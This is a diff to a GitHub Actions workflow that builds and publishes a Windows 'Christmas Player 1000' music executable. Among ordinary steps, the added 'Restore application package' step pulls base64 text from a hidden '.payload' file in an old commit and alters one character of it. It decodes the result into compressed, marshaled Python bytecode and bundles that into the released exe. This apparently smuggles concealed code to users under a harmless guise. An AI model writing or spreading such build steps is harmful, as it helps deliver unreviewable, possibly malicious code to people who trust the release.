@@ -1,13 +1,75 @@
 name: Build Windows EXE
 
 on:
+  push:
+    branches: [main]
+    paths:
+      - ".github/workflows/build-windows.yml"
   workflow_dispatch:
 
 permissions:
   contents: write
 
 jobs:
-  paused:
-    runs-on: ubuntu-latest
+  build:
+    runs-on: windows-latest
     steps:
-      - run: echo "Build configuration is being repaired."
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+
+      - name: Set up Python
+        uses: actions/setup-python@v5
+        with:
+          python-version: "3.13"
+
+      - name: Restore application package
+        shell: pwsh
+        run: |
+          $package = git show fdcd976f2aadc116655c48f509ad138c993e0de6:.payload/part1.txt
+          $package = $package.Replace("iqoQH2E2poHYGpxU6F/MiHA9e", "iqoQH2E2poHYOpxU6F/MiHA9e")
+          [IO.File]::WriteAllBytes("app_payload.bin", [Convert]::FromBase64String($package))
+
+      - name: Verify application package
+        shell: pwsh
+        run: |
+          python -c "import pathlib,zlib,marshal; d=pathlib.Path('app_payload.bin').read_bytes(); marshal.loads(zlib.decompress(d)); print('Package OK')"
+
+      - name: Download legal Christmas recordings
+        shell: pwsh
+        run: |
+          New-Item -ItemType Directory -Force -Path "bundled_music" | Out-Null
+          curl.exe -L "https://commons.wikimedia.org/wiki/Special:Redirect/file/JingleBells-Instrumental-.ogg" -o "bundled_music/JingleBells-Instrumental-.ogg"
+          curl.exe -L "https://commons.wikimedia.org/wiki/Special:Redirect/file/Deck_the_Halls_(USAFB_Concert_Band).ogg" -o "bundled_music/Deck_the_Halls_USAFB.ogg"
+          curl.exe -L "https://commons.wikimedia.org/wiki/Special:Redirect/file/Silent_Night_Librivox_2009.ogg" -o "bundled_music/Silent_Night_Librivox_2009.ogg"
+
+      - name: Install build tools
+        shell: pwsh
+        run: |
+          python -m pip install --upgrade pip
+          python -m pip install pyinstaller customtkinter pygame
+
+      - name: Build Windows EXE
+        shell: pwsh
+        run: |
+          python -m PyInstaller --noconfirm --clean --onefile --windowed --name "Christmas Player 1000" --collect-all customtkinter --collect-all pygame --hidden-import math --hidden-import os --hidden-import random --hidden-import shutil --hidden-import sys --hidden-import tempfile --hidden-import tkinter --hidden-import tkinter.filedialog --hidden-import tkinter.messagebox --hidden-import wave --hidden-import array --hidden-import datetime --hidden-import pathlib --add-data "app_payload.bin;." --add-data "bundled_music;bundled_music" launcher.py
+
+      - name: Upload build artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: Christmas-Player-1000-Windows
+          path: "dist/Christmas Player 1000.exe"
+
+      - name: Publish GitHub Release
+        shell: pwsh
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          $asset = "dist/Christmas Player 1000.exe"
+          gh release view v1.0.0 *> $null
+          if ($LASTEXITCODE -eq 0) {
+            gh release upload v1.0.0 $asset --clobber
+          } else {
+            gh release create v1.0.0 $asset --title "Christmas Player 1000 v1.0.0" --notes "Javított Windows kiadás."
+          }
